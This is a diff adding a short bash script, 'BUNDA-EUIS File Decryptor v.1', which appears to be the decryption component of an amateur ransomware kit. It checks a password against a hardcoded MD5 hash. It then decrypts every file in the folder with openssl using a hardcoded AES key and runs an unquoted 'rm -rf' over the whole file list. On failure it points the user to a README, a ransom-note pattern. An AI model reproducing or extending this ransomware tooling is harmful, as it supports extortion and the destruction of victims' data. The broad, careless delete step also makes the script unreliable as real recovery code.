@@ -1,0 +1,24 @@
+#!/bin/bash
+# BUNDA-EUIS File Decryptor v.1
+# Created by Joe Heartless
+
+bassess="b2472f29989161e34fa960509ab9e732" # <-- Input your md5sum
+echo -n "Enter password to decrypt files: "
+read passwed
+p1=`echo $passwed | md5sum | cut -d' ' -f1`
+if [ "$p1" == "$bassess" ]; then
+		file=$(ls -f *.*)
+		i=1
+		for enc in $file
+		do
+        	echo "[$i] Restoring file Un$enc ..."
+        	openssl enc -d -aes-256-cbc -in $enc -out Un$enc -pbkdf2 -k bundaeuisgeulis #<--- Password encrypt & decrypt
+        	file[i]=$enc
+        	i=$(( i + 1 ))
+		done
+		sleep 1
+		rm -rf $file #Bahaya
+else
+	echo "Wrong password, open README.txt file."
+fi
+
